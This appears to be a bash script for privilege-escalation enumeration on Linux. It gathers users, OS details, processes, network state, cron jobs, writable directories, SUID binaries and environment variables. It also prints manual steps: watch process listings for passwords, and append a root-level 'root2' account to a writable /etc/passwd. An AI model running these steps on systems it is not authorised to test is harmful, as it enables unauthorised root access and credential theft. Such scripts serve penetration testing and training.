#!/bin/bash


echo "This script will attempt to enumerate the Linux"
echo " "
echo " "
echo "================== Start =================="
echo " "
echo " "

echo "========== First Section - Systeminformation =========="
#1.
echo " "
echo "1a. get user information"
echo " "
id
echo " uid = user id"
echo " gid = group id"

echo " "
echo "1b. get all users in system:"
echo " "
cat /etc/passwd

echo "get all users with login access"
cat /etc/passwd | grep -v "/usr/sbin/nologin"

echo " "
echo "1c. get hostname:"
hostname
echo " "
echo "1d. Get Operating system release & version:"
echo "-------Issue-------"
cat /etc/issue
echo " "
echo " "
echo "-------os-release-------"
cat /etc/os-release
echo " "
echo "-------------------------------------------------"
echo "x86_64 means an AMD/Intel processor (64-bit)."
echo "aarch64 means an ARM processor (64-bit)."
echo "armv7l, armv6l, etc., indicate ARM (32-bit)."
echo "-------------------------------------------------"
echo " "
echo "-------arch-------"
arch
echo " "
echo "-------uname -a-------"
uname -a
echo " "
echo " "

echo "========== Second Section - Running System/Services =========="
echo " "
echo " "
echo "2a. Running Processes"
ps aux

echo " "
echo "2b. List all networks"
ifconfig
echo " "
ip a
echo " "
echo "2c. Display routing Tables"
route
echo " "

#echo "2d. List all Network connections"
#ss -anp

#echo " "
#netstat
echo " "
echo "2e. Run this: ss-ntplu to check for ports running / local webservers"
ss -ntplu

echo " "
echo " "
echo "========== Third Section - List all cronjobs =========="

echo "3a. list all scheduled tasks"
ls -lah /etc/cron*

echo " "
echo "3b. list all scheduled tasks that may have insecure file permissions"
crontab -l
echo " "
echo " "

echo "3c. inspect the cron log file for running cron jobs:"
grep "CRON" /var/log/syslog
echo " "
echo " "

echo "========== Fourth Section - Find files with insecure permission using ~find~ =========="
echo " "
find / -writable -type d 2>/dev/null
echo " "
echo " "
echo " "
echo "========== Fifth Section - Find all SUID binaries =========="
find / -perm -u=s -type f 2>/dev/null
echo " "
echo " "
echo "========== Sixth Section - Inspect User Trails =========="
echo " "
echo "6a. Find any unusual environment variable entry"
echo " "
env
echo " "
echo " "
echo "-------------------"
echo "check for any resemblence of password. Manually go enter cat .bashrc"
echo "-------------------"
echo " "
echo " "
echo "6b. Inspecting Service Footprints"
echo "check if any command inputs the password and grep results on the occurence of the word pass for 1 minute"
echo "------ Manually run below command ------"
echo '  timeout 1m watch -n 1 "ps -aux | grep pass"  '
echo " "
echo " "
echo "========== Seventh Section - See if you can abuse the passwd file permission =========="
echo " "
echo "------ Manually Run the following commands ------"
echo '  openssl passwd Welcome2025!  '
echo '  root2:$sslpassword:0:0:root:/root:/bin/bash >> /etc/passwd  '
echo '  su root2  '
echo " "
echo " "
echo "========== Eigth Section - See if you can run the following sudo permission =========="
echo "run sudo -l manually"
echo "run sudo -i manually"
